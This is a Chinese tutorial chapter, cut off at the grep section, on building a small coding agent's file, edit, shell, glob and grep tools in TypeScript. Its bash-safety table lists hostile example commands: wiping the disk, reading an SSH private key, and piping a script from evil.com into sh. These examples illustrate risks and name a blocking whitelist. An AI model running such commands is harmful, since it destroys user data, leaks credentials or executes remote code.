    第三章：完整工具集 — Edit/Bash/Glob/Grep¶

    6 个工具，约 400 行代码，让模型真正能干活：读写编辑文件、执行命令、搜索代码。

    本章是整本书的"能力分水岭"。前两章的模型只会说话，从这一章起，它会动手。

    3.1 本章目标¶

    读完本章后，你应当能够：

    1. 说清楚每个工具（read / write / edit / bash / glob / grep）为什么存在、解决什么问题、怎么实现；
    2. 理解 edit_file 为什么用"精确替换"而不是"覆盖整文件"，为什么要求 oldString 唯一匹配；
    3. 理解 bash 工具背后 child_process.exec 的工作原理、超时机制、输出拼接逻辑；
    4. 理解 glob 的模式语法（**、*、?）如何被翻译成正则，以及为什么要跳过 node_modules / .git；
    5. 理解 grep 如何逐文件逐行做正则匹配，结果为什么是 文件名:行号: 内容 格式；
    6. 掌握"每个工具一个文件 + index.ts 注册表 + executeTool 统一入口"的模块化组织方式；
    7. 能自己新增一个工具（例如 list_dir、rename）并接入主循环。

    本章代码位于 lessons/ch03-tools-full/，约 400 行 TypeScript。

    3.2 前置知识：为什么需要更多工具¶

    3.2.1 只会说话的模型有什么做不到¶

    回顾第二章结尾，我们的模型已经有 read_file 和 write_file 两个工具。它能做两件事：

    • 看一个文件的内容；
    • 把一段内容写进文件。

    听起来够用了？远远不够。想象你对它说：

    "帮我把 main.ts 里所有 console.log 改成 console.error，然后跑一下测试看看通不通过。"

    模型要做这件事，至少需要四种能力：

    能力 需要的工具 只用 read/write 能做到吗
    找到所有 console.log 的位置 grep 勉强能（read 整个文件自己数），但跨文件就废了
    只改匹配的行，不动其他内容 edit_file 不能（write 只能整文件覆盖，要先 read 再拼回去再 write，三步且容易出错）
    执行测试命令 bash 完全不能
    在多个文件里找某个模式 grep / glob 完全不能

    所以前两章的模型本质上是个"会读会写的鹦鹉"，而真实开发者每天做的事——搜索、精确修改、运行命令、批量查找——它一件都做不好。

    3.2.2 每个工具解决什么问题¶

    我们把缺的能力一条条列出来，每条对应一个工具：

    1. "我想看某个文件" → read_file（已有，但本章会完善它的大文件截断）。
    2. "我想新建/覆盖一个文件" → write_file（已有，本章补上自动建目录）。
    3. "我想改文件的一小部分，不想重写整个文件" → edit_file（新）。这是最关键的升级。
    4. "我想跑一条 shell 命令（测试、构建、git、python …）" → bash（新）。
    5. "我想按文件名模式找文件，比如所有 .ts 文件" → glob（新）。
    6. "我想按内容找代码，比如所有用到 console.log 的地方" → grep（新）。

    这 6 个工具加起来，模型就从"会读会写"升级到"能搜索、能改、能执行"，也就是真正能干活的"迷你 Claude Code"了。

    3.2.3 为什么是这 6 个，不多不少¶

    你可能会问：为什么不加 delete、rename、chmod、curl …？

    答案是最小完备集。真实 Claude Code 的工具远不止 6 个，但本章的目标是"用最少的工具让模型能完成典型任务"。这 6 个工具覆盖了"读、写、改、执行、按名找、按内容找"六大动作，其余操作都能组合出来：

    • 删除文件 → bash 执行 rm；
    • 重命名 → bash 执行 mv；
    • 下载 → bash 执行 curl；
    • 看目录结构 → glob 用 **/* 模式。

    少则易学，多则易乱。先把这 6 个吃透，后面再加任何工具都是同一套套路。

    注意每个工具文件都很短（35–85 行）。这是有意为之——一个工具只做一件事，代码自然就短。后面会讲为什么这样设计。

    3.4 工具设计四原则¶

    在逐个讲工具之前，先立四条贯穿全章的设计原则。后面每个工具的实现都能映射到这四条上。

    原则 1：单一职责¶

    一个工具只做一件事。read_file 只读，edit_file 只改，bash 只执行。

    反面例子：假如把 edit_file 设计成"既能改文件又能新建文件还能删除文件"，那它的参数 schema 会变得很复杂（要区分 mode: "edit" | "create" | "delete"），模型更容易调错，代码也更难维护。

    正面例子：本章的 edit_file 只做"找到 oldString 替换成 newString"。想新建文件？用 write_file。想删除？用 bash 跑 rm。职责清晰，互不越界。

    原则 2：描述清晰¶

    每个工具的 description 字段是给模型看的——模型靠这段文字决定什么时候调这个工具、传什么参数。描述写得含糊，模型就会乱调。

    对比两种写法：

    // 差：模型不知道这工具会覆盖原文件
description: "写文件"

// 好：明确说了"已存在则覆盖"，模型就知道要先 read 再 write
description: "将内容写入指定路径的文件。如果文件已存在则覆盖，不存在则创建（含中间目录）。"

    本章每个工具的 description 都写明了做什么 + 关键行为 + 何时该用，这是模型能正确选工具的前提。

    原则 3：错误友好¶

    工具出错时，不要抛异常，而是返回一段人话给模型。模型读到这段话就能自我纠正。

    // 差：抛异常，主循环崩掉，模型啥也不知道
throw new Error("文件不存在");

// 好：返回中文错误，模型看到后会说"那我先创建它"
return `错误: 文件不存在: ${input.path}`;

    本章所有工具的 execute 函数都用 try/catch 兜底，把异常转成字符串返回。模型拿到错误文本后，往往能自己想出下一步（比如"文件不存在 → 我先用 write_file 创建它"）。

    原则 4：结果可控¶

    工具的返回值会原样塞回模型的上下文。如果返回 10 万行，模型的上下文就爆了。所以每个工具都要限制输出大小：

    • read_file：超过 2000 行截断；
    • glob：最多返回 100 个文件；
    • grep：最多返回 200 条匹配；
    • bash：maxBuffer 限制 10MB，超了报错；
    • edit_file / write_file：只返回一行成功提示，不返回文件内容。

    这四条原则请记在心里，下面看每个工具时随时对照。

    3.5 read_file — 读取文件¶

    3.5.1 为什么需要它¶

    模型要改一个文件，第一步永远是"先看看里面有什么"。read_file 就是这个"看"的动作。

    你可能会问：模型不能直接用 bash 跑 cat 吗？能，但有两个问题：

    1. cat 不告诉你行号，模型改文件时不知道该改第几行；
    2. 多绕一层 shell，慢且容易出编码问题（Windows 上 cat 中文乱码）。

    所以专门的 read_file 更快、更稳、更可控。

    3.5.2 完整代码¶

    // tools/read.ts
import * as fs from "fs";
import * as path from "path";

export const readTool = {
  name: "read_file",
  description:
    "读取指定路径的文件内容。返回文件的文本内容。如果文件很大，只返回前 2000 行。",
  input_schema: {
    type: "object" as const,
    properties: {
      path: {
        type: "string",
        description: "要读取的文件路径",
      },
    },
    required: ["path"],
  },
};

export function executeRead(input: { path: string }): string {
  try {
    const filePath = path.resolve(input.path);
    if (!fs.existsSync(filePath)) {
      return `错误: 文件不存在: ${input.path}`;
    }
    const content = fs.readFileSync(filePath, "utf-8");
    const lines = content.split("\n");
    if (lines.length > 2000) {
      return lines.slice(0, 2000).join("\n") + `\n\n... (共 ${lines.length} 行，已截断显示前 2000 行)`;
    }
    return content;
  } catch (err: any) {
    return `错误: ${err.message}`;
  }
}

    3.5.3 逐行讲解¶

    第 1–2 行：导入模块 - fs：Node.js 内置文件系统模块，提供 readFileSync、existsSync 等。 - path：路径处理模块，path.resolve 把相对路径转成绝对路径，跨平台兼容。

    第 4–18 行：工具定义 readTool - name：工具名，模型调用时用这个名字。 - description：给模型看的说明。注意"如果文件很大，只返回前 2000 行"——模型看到这句就知道大文件可能被截断，需要的话可以分段读。 - input_schema：JSON Schema，声明参数。required: ["path"] 表示 path 必传。这个 schema 会被发给 API，API 用它约束模型的输出。

    第 20 行：executeRead 函数签名 - 输入是 { path: string }，输出是 string。注意输出永远是字符串，不是对象、不是 Buffer。这样主循环不用区分类型，直接把结果塞回模型上下文。

    第 22 行：path.resolve(input.path) - 把用户传的路径（可能是相对路径如 "./src/main.ts"）转成绝对路径。这一步不是必须的，但能让错误信息更清晰，也避免某些 Windows 边界问题。

    第 23–25 行：文件存在性检查 - fs.existsSync 同步检查文件是否存在。不存在就直接返回中文错误，不抛异常（原则 3）。 - 注意错误信息里用的是 input.path（原始路径）而不是 filePath（绝对路径），因为原始路径对模型更友好——它传的是什么就回显什么。

    第 26 行：fs.readFileSync(filePath, "utf-8") - 同步读取整个文件，编码指定 utf-8。如果不指定编码，返回的是 Buffer，要再 .toString()，多一步且容易忘。

    第 27–30 行：大文件截断 - content.split("\n") 按行切分。 - 超过 2000 行就 slice(0, 2000) 取前 2000 行，再拼一行提示告诉模型总行数。 - 为什么是 2000？经验值。一行平均 80 字符，2000 行约 16 万字符，对模型上下文是安全的大小。真实 Claude Code 也是 2000 行起步。 - 为什么不返回行号？为了简化。真实 Claude Code 的 read 会给每行加 行号: 前缀，本章省略了这一步（练习题会让你补上）。

    第 32–34 行：catch 兜底 - 任何意外（权限不足、路径是目录不是文件、磁盘错误…）都转成字符串返回。

    3.5.4 常见陷阱¶

    陷阱 现象 解决
    读的是目录不是文件 readFileSync 报 EISDIR existsSync 之后再加 fs.statSync(p).isFile() 判断
    二进制文件 返回乱码 真实实现会先检测文件类型，本章简化了
    超大文件 内存占用高 readFileSync 一次性读入，10MB 文件没事，1GB 就炸了。生产环境用流式读取

    3.6 write_file — 写入文件¶

    3.6.1 为什么需要它¶

    模型要把一段内容存成文件，就需要 write_file。它和 edit_file 的区别：

    • write_file：整文件覆盖。适合新建文件或完全重写。
    • edit_file：局部修改。适合改一两行，不动其他部分。

    模型该怎么选？规则很简单：新建用 write，改几行用 edit。

    3.6.2 完整代码¶

    // tools/write.ts
import * as fs from "fs";
import * as path from "path";

export const writeTool = {
  name: "write_file",
  description:
    "将内容写入指定路径的文件。如果文件已存在则覆盖，不存在则创建（含中间目录）。",
  input_schema: {
    type: "object" as const,
    properties: {
      path: { type: "string", description: "要写入的文件路径" },
      content: { type: "string", description: "要写入的文件内容" },
    },
    required: ["path", "content"],
  },
};

export function executeWrite(input: { path: string; content: string }): string {
  try {
    const filePath = path.resolve(input.path);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(filePath, input.content, "utf-8");
    return `已成功写入文件: ${input.path} (${input.content.length} 字符)`;
  } catch (err: any) {
    return `错误: ${err.message}`;
  }
}

    3.6.3 逐行讲解¶

    第 27–29 行：自动建中间目录 - path.dirname(filePath) 取父目录。比如写 a/b/c.txt，父目录是 a/b。 - fs.mkdirSync(dir, { recursive: true }) 递归创建，相当于 mkdir -p。recursive: true 是 Node 10+ 才有的选项，没有它就要自己一层层建。 - 这一步让模型可以直接写 src/utils/helper.ts 而不用担心目录不存在。

    第 30 行：fs.writeFileSync - 同步写入，已存在则覆盖。注意没有确认提示——模型说写就写。这是工具的本质：它是执行者，不是审批者。

    第 31 行：返回成功信息 - 返回写入字符数，让模型知道写进去了多少。这个数字在调试时很有用（比如模型以为自己写了 1000 行其实只写了 10 行，看字符数就能发现）。

    3.6.4 为什么不返回文件内容¶

    write_file 只返回"已成功写入"，不返回文件内容。原因：

    1. 模型刚写的内容它自己知道（就是它传的 content），回显一遍浪费上下文；
    2. 写完通常紧接着做别的事（运行、编辑），不需要再看一遍内容。

    对比 read_file 必须返回内容——因为模型读文件就是为了看内容。返回什么取决于模型下一步需要什么。

    3.7 edit_file — 精确替换（本章重头戏）¶

    3.7.1 为什么不直接用 write_file 改文件¶

    假设 main.ts 有 200 行，模型只想改第 50 行的一个变量名。用 write_file 怎么办？

    1. 先 read_file 读出 200 行；
    2. 在脑子里把第 50 行改掉；
    3. 把 200 行重新 write_file 回去。

    这有三个严重问题：

    • 浪费 token：模型要把 200 行原封不动输出一遍，其中 199 行没变。一次编辑花 200 行的输出 token，太贵。
    • 容易出错：模型在"重写 200 行"时可能手抖改错别的行，或者漏掉几行，导致文件损坏。
    • 不可审查：你看到模型输出了 200 行，根本不知道它实际改了哪一行。

    edit_file 的思路完全不同：模型只说要改哪一小段、改成什么，工具去找并替换。

    • 模型输出：oldString = "const x = 1", newString = "const x = 2"，几十个 token；
    • 工具在文件里找到 "const x = 1"，替换成 "const x = 2"，其他 199 行原封不动；
    • 你一眼就能看出模型改了什么。

    3.7.2 为什么用"精确替换"而不是"行号替换"¶

    另一种设计是：模型说"把第 50 行改成 XXX"。听起来更简单，但有几个坑：

    • 行号会漂移：如果模型一次性做多个编辑，第一个编辑插入了一行，后面的行号全变了。模型很难算清楚。
    • 空白行干扰：不同编辑器对空行的计数不一样，容易差 1。
    • 模型不知道行号：模型虽然有文件内容，但它不一定精确记得"那行代码在第几行"，它记得的是"那行代码长什么样"。

    所以用"内容匹配"比"行号定位"更可靠。模型说"把这段长这样的代码改成那样"，工具去找，找到就改。

    3.7.3 为什么要求 oldString 唯一匹配¶

    这是 edit_file 最关键的设计。看代码：

    const occurrences = content.split(input.oldString).length - 1;
if (occurrences === 0) {
  return `错误: 未找到匹配的文本。请检查 oldString 是否准确。`;
}
if (occurrences > 1) {
  return `错误: 找到 ${occurrences} 处匹配，oldString 不唯一。请提供更多上下文使其唯一。`;
}

    content.split(oldString).length - 1 是数 oldString 在文件里出现几次的技巧——split 把字符串按分隔符切开，切出来的段数减 1 就是分隔符出现次数。

    三种情况：

    1. 0 次：文件里没有这段文本。模型可能记错了，或者文件已经被别的工具改过。返回错误让模型重新 read。
    2. 正好 1 次：完美，精确替换。
    3. 2 次及以上：文件里有多处长得一样。如果直接替换第一个，可能改错地方。拒绝执行，让模型提供更多上下文使匹配唯一。

    为什么这么严格？举个真实例子：

    文件里有两处 name: "test"： 

    // config.ts
const env = { name: "test" };      // 第 3 行
const db  = { name: "test" };      // 第 4 行

    模型想把第 3 行的 "test" 改成 "prod"，它传 oldString = 'name: "test"'。如果不做唯一性检查，工具可能改到第 4 行，数据库配置就错了——而且没人会发现，因为工具返回"成功"。

    唯一性约束逼模型把上下文写全：

    oldString = 'const env = { name: "test" };'

    这样只匹配第 3 行，绝对不会改错。用约束换安全，这是工具设计的核心思想。

    3.7.4 完整代码¶

    // tools/edit.ts
import * as fs from "fs";
import * as path from "path";

export const editTool = {
  name: "edit_file",
  description:
    "精确编辑文件：将文件中的 oldString 替换为 newString。oldString 必须在文件中唯一匹配，否则报错。用于修改文件的特定部分，而非覆盖整个文件。",
  input_schema: {
    type: "object" as const,
    properties: {
      path: { type: "string", description: "要编辑的文件路径" },
      oldString: {
        type: "string",
        description: "要被替换的原始文本（必须在文件中唯一匹配）",
      },
      newString: {
        type: "string",
        description: "替换后的新文本",
      },
    },
    required: ["path", "oldString", "newString"],
  },
};

export function executeEdit(input: {
  path: string;
  oldString: string;
  newString: string;
}): string {
  try {
    const filePath = path.resolve(input.path);
    if (!fs.existsSync(filePath)) {
      return `错误: 文件不存在: ${input.path}`;
    }

    const content = fs.readFileSync(filePath, "utf-8");

    const occurrences = content.split(input.oldString).length - 1;
    if (occurrences === 0) {
      return `错误: 未找到匹配的文本。请检查 oldString 是否准确。`;
    }
    if (occurrences > 1) {
      return `错误: 找到 ${occurrences} 处匹配，oldString 不唯一。请提供更多上下文使其唯一。`;
    }

    const newContent = content.replace(input.oldString, input.newString);
    fs.writeFileSync(filePath, newContent, "utf-8");
    return `已成功编辑文件: ${input.path}`;
  } catch (err: any) {
    return `错误: ${err.message}`;
  }
}

    3.7.5 逐行讲解¶

    第 34 行：path.resolve —— 同 read，转绝对路径。

    第 35–37 行：存在性检查 —— 文件不存在直接返回错误。注意 edit_file 不会自动创建文件（那是 write_file 的职责，原则 1：单一职责）。

    第 39 行：读取当前内容 —— 必须先读才能数匹配次数。edit_file 内部其实做了"读 → 改 → 写"三步，但对模型只暴露"改"这一步。

    第 41 行：数匹配次数 —— content.split(input.oldString).length - 1。这个技巧比 content.match(new RegExp(...)) 更稳，因为 oldString 里可能有正则特殊字符（. * ( ) 等），用 split 当纯字符串处理就不会误解析。

    第 42–47 行：唯一性校验 —— 上一节讲过，0 次和多于 1 次都拒绝。

    第 49 行：执行替换 —— content.replace(oldString, newString)。注意 JavaScript 的 String.replace 当第一个参数是字符串时只替换第一个。但因为我们已经确认唯一匹配，替换第一个就是替换全部，没问题。

    第 50 行：写回文件 —— fs.writeFileSync 覆盖写。此时文件内容只有 oldString 那一段变了，其余原封不动。

    第 51 行：返回成功 —— 只说"已成功编辑"，不返回文件内容（模型知道自己改了什么，不需要回显）。

    3.7.6 replaceAll 场景¶

    真实 Claude Code 的 edit_file 有个 replaceAll 选项：当文件里有多处相同文本，模型可以显式说"全部替换"。

    本章没实现 replaceAll，但加很简单：

    // 伪代码
if (occurrences > 1 && !input.replaceAll) {
  return `错误: 找到 ${occurrences} 处匹配...`;
}
// replaceAll 为 true 时，用 split + join 替换全部
const newContent = content.split(input.oldString).join(input.newString);

    为什么本章不加？因为 replaceAll 是"高级用法"，初学者先理解"唯一匹配"这个核心约束更重要。等第四章以后再扩展。

    3.7.7 常见陷阱¶

    陷阱 现象 原因 解决
    空白不匹配 报"未找到" oldString 里缩进用了空格，文件里是 tab，或反之 模型应先 read 看清楚缩进
    换行符不一致 报"未找到" Windows 上文件是 \r\n，模型传的是 \n 工具内部可统一 normalize，本章简化了
    多处匹配 报"不唯一" oldString 太短 把上下文多包含几行，使匹配唯一
    改完破坏语法 文件能改但代码跑不了 模型只改了一处，漏改了关联的地方 这是模型智能问题，工具管不了；用 bash 跑测试兜底

    3.8 bash — 执行命令¶

    3.8.1 为什么需要它¶

    没有 bash，模型就是个"只会动文件的书呆子"——能改代码但不能运行代码。有了 bash，模型能：

    • 跑测试：npm test、pytest；
    • 构建：tsc、webpack；
    • 用 git：git status、git diff；
    • 跑脚本：python hello.py、node main.js；
    • 看进程、装依赖、起服务……几乎什么都能做。

    bash 是能力最大的工具，也是最危险的工具——它能执行任意命令，包括 rm -rf /。后面讲安全风险。

    3.8.2 child_process.exec 原理¶

    Node.js 的 child_process 模块提供四种执行子进程的方式：

    函数 特点 适用场景
    exec 用 shell 执行，回调拿全部 stdout 跑 shell 命令、脚本
    execFile 不经过 shell，直接执行文件 跑可执行文件，避免 shell 注入
    spawn 流式返回 stdout，适合大量输出 处理流媒体、大文件
    fork 专门 fork Node 子进程 多进程 Node 程序

    本章用 exec，因为它经过 shell，所以可以用管道、重定向、环境变量展开等 shell 特性：

    ls -la | grep ".ts"    # 管道
echo $HOME             # 变量展开
cat a.txt > b.txt      # 重定向

    exec 的工作流程：

    1. Node 起一个子进程，把命令交给系统的 shell（Windows 是 cmd.exe，Linux 是 /bin/sh）；
    2. shell 解析并执行命令；
    3. 命令的 stdout、stderr 被收集到两个 Buffer 里；
    4. 命令结束（或超时），Node 调用回调，把 Buffer 转成字符串传给你。

    3.8.3 完整代码¶

    // tools/bash.ts
import { exec } from "child_process";

export const bashTool = {
  name: "bash",
  description:
    "执行 shell 命令并返回 stdout + stderr。默认超时 120 秒。用于运行测试、构建、git 等命令。",
  input_schema: {
    type: "object" as const,
    properties: {
      command: { type: "string", description: "要执行的 shell 命令" },
      timeout: { type: "number", description: "超时时间（毫秒），默认 120000" },
    },
    required: ["command"],
  },
};

export function executeBash(input: {
  command: string;
  timeout?: number;
}): Promise<string> {
  return new Promise((resolve) => {
    const timeout = input.timeout || 120000;
    exec(
      input.command,
      { timeout, maxBuffer: 1024 * 1024 * 10 },
      (error, stdout, stderr) => {
        let result = "";
        if (stdout) result += stdout;
        if (stderr) result += `\n[stderr]\n${stderr}`;
        if (error) {
          result += `\n[exit code: ${error.code || 1}]`;
        }
        if (!result) result = "(无输出)";
        resolve(result);
      }
    );
  });
}

    3.8.4 逐行讲解¶

    第 23–26 行：返回 Promise - executeBash 是本章唯一返回 Promise 的工具（其他都是同步返回 string）。因为 exec 是异步的，命令可能要跑几秒甚至几十秒。 - 用 new Promise((resolve) => {...}) 把回调式 API 包成 Promise，这样主循环可以用 await。

    第 27 行：超时默认值 - input.timeout || 120000：如果模型没传 timeout，用 120 秒。 - 120 秒能覆盖绝大多数测试和构建。如果模型传了更长的（比如 npm install 大项目要 5 分钟），就用模型的值。 - 超时后 exec 会杀掉子进程，回调里 error 会带 killed: true。

    第 29 行：exec 调用 - 第一个参数：命令字符串。 - 第二个参数：选项对象。 - timeout：超时毫秒数。超时后子进程被 SIGTERM 杀掉。 - maxBuffer: 1024 * 1024 * 10 = 10MB。stdout 和 stderr 各最多 10MB。超过就触发回调的 error。为什么限制？ 防止 yes 或 cat huge.log 这种命令把内存吃光。 - 第三个参数：回调，签名 (error, stdout, stderr) => void。

    第 30–34 行：拼接输出 - result 先放 stdout（正常输出）。 - 如果有 stderr，加一段 [stderr] 标签再拼上。标签让模型能区分正常输出和错误输出。 - 如果有 error（命令失败或超时），拼上 [exit code: N]。error.code 是退出码，拿不到就默认 1。 - 为什么不直接 throw error？因为我们要把错误信息返回给模型（原则 3），让模型看到"命令失败了，退出码 2"后自己决定怎么办。

    第 35 行：空输出处理 - 命令成功但啥都没输出（比如 mkdir 成功了没打印东西），返回 "(无输出)"。否则返回空字符串，模型会困惑"是没输出还是工具坏了"。

    3.8.5 stdout / stderr / exit code 三件套¶

    理解这三个概念是理解命令执行的关键：

    • stdout（标准输出）：命令正常结果打到这里。比如 ls 的文件列表、cat 的文件内容。
    • stderr（标准错误）：命令的警告、错误信息打到这里。比如 gcc 编译错误、npm 的 deprecation 警告。
    • exit code（退出码）：命令结束时给操作系统的一个数字。0 表示成功，非 0 表示失败。比如 test 命令成功返回 0，失败返回 1。

    为什么要分开？因为：

    • 有些命令成功时 stderr 也有内容（警告），不能光看 stderr 判断成败；
    • 有些命令失败时 stdout 也有内容（部分结果），不能光看 stdout 判断成败；
    • exit code 才是成败的权威信号。

    本章把三者都拼进结果，模型能看到全貌自己判断。

    3.8.6 安全风险（重要）¶

    bash 能执行任意命令，这意味着：

    风险 例子 后果
    删除文件 rm -rf / 或 rm -rf ~ 灾难性，删光用户文件
    信息泄露 cat ~/.ssh/id_rsa 私钥泄露
    网络请求 curl evil.com | sh 下载并执行恶意脚本
    权限提升 sudo ... 如果有 sudo 权限，可改系统文件

    真实 Claude Code 怎么防？

    1. 命令白名单：只允许一部分命令（git、npm、python …），禁止 rm、curl、sudo 等。
    2. 工作目录限制：只能在工作目录下操作，不能 cd / 后搞事。
    3. 用户确认：危险命令弹窗让用户确认。
    4. 审计日志：每条命令都记下来，事后可查。

    本章一个都没做——因为这是教学项目，目的是理解原理。生产环境一定要加这些防护。练习题会带你实现一个简单的命令白名单。

    3.8.7 常见陷阱¶

    陷阱 现象 解决
    命令卡死 工具一直不返回 timeout 兜底，120 秒必杀
    输出太大 触发 maxBuffer 报错 调大 maxBuffer 或命令里加 | head
    Windows 路径 ls 在 Windows 不存在 用跨平台命令，或检测平台
    中文乱码 Windows 默认 GBK 设 chcp 65001 或用 execFile 指定编码
    环境变量缺失 NODE_ENV 没设 exec 默认继承父进程 env，必要时显式传

    3.9 glob — 文件搜索¶

    3.9.1 为什么需要它¶

    模型经常要"找一批文件"，比如：

    • "项目里所有 TypeScript 文件" → **/*.ts
    • "src 目录下所有测试文件" → src/**/*.test.ts
    • "所有配置文件" → **/*.{json,yaml}

    bash 跑 find 也能做，但 glob 有三个优势：

    1. 跨平台：Windows 没有 find，只有 dir，命令完全不同；
    2. 自动跳过 node_modules / .git：find 默认全扫，慢且结果一堆噪音；
    3. 结果干净：只返回相对路径，一行一个，模型好处理。

    3.9.2 glob 模式语法¶

    glob 是文件名匹配的"小语言"，核心符号三个：

    符号 含义 例子 匹配
    * 匹配单层任意字符（不含 /） *.ts a.ts、util.ts，不匹配 src/a.ts
    ** 匹配任意层目录（含 /） **/*.ts a.ts、src/a.ts、src/sub/a.ts
    ? 匹配单个字符 a?.ts a1.ts、ab.ts，不匹配 a.ts
    {a,b} 匹配 a 或 b *.{ts,js} a.ts、a.js
    [abc] 匹配方括号里任一字符 [abc].ts a.ts、b.ts、c.ts

    最常用的是 **/*.ts（所有 .ts 文件）和 src/**/*（src 下所有文件）。

    * 和 ** 的区别是 glob 最容易混淆的点：

    • *.ts 只匹配当前目录下的 .ts 文件，不递归；
    • **/*.ts 匹配任意深度目录下的 .ts 文件，递归。

    为什么 * 不含 /？因为如果 * 能匹配 /，那 *.ts 就会匹配 src/a.ts，单层通配就失去意义了。* 专门管"文件名部分"，** 专门管"目录深度"，分工明确。

    3.9.3 完整代码¶

    // tools/glob.ts
import * as fs from "fs";
import * as path from "path";

export const globTool = {
  name: "glob",
  description:
    "按 glob 模式搜索文件。支持 ** 递归、* 单层通配。如 **/*.ts 搜索所有 TypeScript 文件。返回匹配的文件路径列表。",
  input_schema: {
    type: "object" as const,
    properties: {
      pattern: { type: "string", description: "glob 模式，如 **/*.ts 或 src/**/*.js" },
      cwd: { type: "string", description: "搜索的根目录，默认为当前工作目录" },
    },
    required: ["pattern"],
  },
};

function matchGlob(filePath: string, pattern: string): boolean {
  const regex = pattern
    .replace(/\./g, "\\.")
    .replace(/\*\*/g, "<<<GLOBSTAR>>>")
    .replace(/\*/g, "[^/]*")
    .replace(/<<<GLOBSTAR>>>/g, ".*");
  return new RegExp(`^${regex}$`).test(filePath);
}

function walkDir(dir: string, baseDir: string, results: string[]): void {
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    if (entry.name === "node_modules" || entry.name === ".git") continue;
    const fullPath = path.join(dir, entry.name);
    const relPath = path.relative(baseDir, fullPath).replace(/\\/g, "/");
    if (entry.isDirectory()) {
      walkDir(fullPath, baseDir, results);
    } else {
      results.push(relPath);
    }
  }
}

export function executeGlob(input: {
  pattern: string;
  cwd?: string;
}): string {
  try {
    const baseDir = path.resolve(input.cwd || process.cwd());
    const allFiles: string[] = [];
    walkDir(baseDir, baseDir, allFiles);

    const matched = allFiles
      .filter((f) => matchGlob(f, input.pattern))
      .sort();

    if (matched.length === 0) {
      return `未找到匹配 "${input.pattern}" 的文件`;
    }
    return matched.slice(0, 100).join("\n") + (matched.length > 100 ? `\n\n... (共 ${matched.length} 个文件，已截断)` : "");
  } catch (err: any) {
    return `错误: ${err.message}`;
  }
}

    3.9.4 逐行讲解 — matchGlob 函数¶

    matchGlob 把 glob 模式翻译成正则，再用正则匹配文件路径。这是 glob 实现的核心技巧。

    function matchGlob(filePath: string, pattern: string): boolean {
  const regex = pattern
    .replace(/\./g, "\\.")        // 1. 先把 . 转义成 \.
    .replace(/\*\*/g, "<<<GLOBSTAR>>>")  // 2. 把 ** 暂存成占位符
    .replace(/\*/g, "[^/]*")      // 3. 把剩下的 * 转成 [^/]*
    .replace(/<<<GLOBSTAR>>>/g, ".*");   // 4. 把占位符转成 .*
  return new RegExp(`^${regex}$`).test(filePath);
}

    四步替换的原因：

    第 1 步：.replace(/\./g, "\\.") - glob 里的 . 是字面意思（文件名里的点），但正则里 . 是"任意字符"。所以先把所有 . 转义成 \.，让正则把它当字面点。 - 比如 *.ts → *\.ts。

    第 2 步：.replace(/\*\*/g, "<<<GLOBSTAR>>>") - 把 ** 暂存成一个占位符。为什么要暂存？ 因为下一步要把 * 转成 [^/]*，如果不先处理 **，** 会被转成 [^/]*[^/]*，语义就错了。先存起来，等 * 处理完再放回去。

    第 3 步：.replace(/\*/g, "[^/]*") - 把单个 * 转成 [^/]*——匹配任意字符除了 /。这就是 * 不跨目录的实现方式。 - 比如 *\.ts → [^/]*\.ts。

    第 4 步：.replace(/<<<GLOBSTAR>>>/g, ".*") - 把占位符放回去，转成 .*——匹配任意字符包括 /。这就是 ** 跨目录的实现。 - 比如 **/*.ts 经过四步变成 .*[^/]*\.ts，能匹配 src/sub/a.ts。

    最后一行：new RegExp(\^${regex}$`)** - 加^和$锚定首尾，确保**整条路径**匹配，而不是部分匹配。 - 比如^.[^/].ts$匹配src/a.ts，但不匹配src/a.ts.bak`。

    这个实现是简化版，不支持 {a,b}、[abc]、?。真实库（如 fast-glob、micromatch）支持完整语法，但核心思路一样：glob → 正则 → 匹配。

    3.9.5 逐行讲解 — walkDir 函数¶

    walkDir 递归遍历目录，收集所有文件的相对路径。

    function walkDir(dir: string, baseDir: string, results: string[]): void {
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    if (entry.name === "node_modules" || entry.name === ".git") continue;
    const fullPath = path.join(dir, entry.name);
    const relPath = path.relative(baseDir, fullPath).replace(/\\/g, "/");
    if (entry.isDirectory()) {
      walkDir(fullPath, baseDir, results);
    } else {
      results.push(relPath);
    }
  }
}

    第 1 行：fs.readdirSync(dir, { withFileTypes: true }) - 读目录下所有条目。withFileTypes: true 让每个条目带类型信息（文件/目录/符号链接），这样不用再 stat 一次，省 IO。

    第 3 行：跳过 node_modules 和 .git - 这两个目录通常巨大（node_modules 几万文件，.git 几千对象），扫它们又慢又没用——模型几乎不会想看里面的文件。 - 为什么不跳过所有隐藏目录？因为有些项目把配置放 .github、.vscode，模型可能需要找。只跳过这两个"已知的噪音源"。

    第 4 行：path.join 拼全路径 - path.join 跨平台处理分隔符（Windows 用 \，Linux 用 /）。

    第 5 行：算相对路径 - path.relative(baseDir, fullPath) 算出相对于根目录的路径，比如 src/a.ts。 - .replace(/\\/g, "/") 把 Windows 反斜杠转成正斜杠，统一格式。这样 glob 模式里写 / 就能匹配，不用考虑平台差异。

    第 6–9 行：递归或收集 - 是目录就递归进去，是文件就推进 results。 - 递归没有深度限制——理论上极深嵌套会栈溢出，实际项目几乎不会遇到。

    3.9.6 逐行讲解 — executeGlob 函数¶

    const baseDir = path.resolve(input.cwd || process.cwd());
const allFiles: string[] = [];
walkDir(baseDir, baseDir, allFiles);

const matched = allFiles
  .filter((f) => matchGlob(f, input.pattern))
  .sort();
    • 先遍历拿到所有文件，再 filter 出匹配的。这是"先收集再过滤"的简单做法。
    • 缺点：大项目里 allFiles 可能几万个，全收集再过滤有点浪费。优化做法是边遍历边过滤，但代码复杂得多，本章用简单版。
    • .sort() 让结果按字母序排，方便模型看。
    return matched.slice(0, 100).join("\n") + (matched.length > 100 ? `\n\n... (共 ${matched.length} 个文件，已截断)` : "");
    • 最多返回 100 个（原则 4：结果可控）。超过加一行提示告诉模型总数。
    • 为什么是 100？经验值。100 个文件路径约 2000 字符，对上下文友好。真实 Claude Code 限制更宽松，但教学版保守一点。

    3.10 grep — 内容搜索¶

    3.10.1 为什么需要它¶

    glob 找文件名，grep 找文件内容。典型用法：

    • "项目里哪些文件用了 console.log" → grep "console.log"
    • "找到所有 TODO 注释" → grep "TODO"
    • "找函数定义" → grep "function\\s+\\w+"（正则）
    • "只在 .ts 文件里找" → grep "import" --include "*.ts"

